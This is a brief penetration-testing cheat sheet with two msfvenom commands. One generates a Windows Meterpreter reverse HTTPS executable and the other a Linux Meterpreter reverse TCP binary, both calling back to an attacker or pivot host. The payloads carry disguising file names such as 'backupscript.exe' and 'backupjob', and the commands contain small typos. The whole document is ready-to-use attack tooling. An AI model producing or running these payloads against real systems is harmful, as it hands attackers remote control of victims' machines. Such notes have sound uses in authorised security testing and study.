# msfvenom

% payload


## msfvenom - Generate reverse HTTPS payload
```
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InteralIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```
## msfvenom - Generate reverse TCP payload
```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IPaddressofAttackHost -f elf -o backupjob LPORT=8080
```

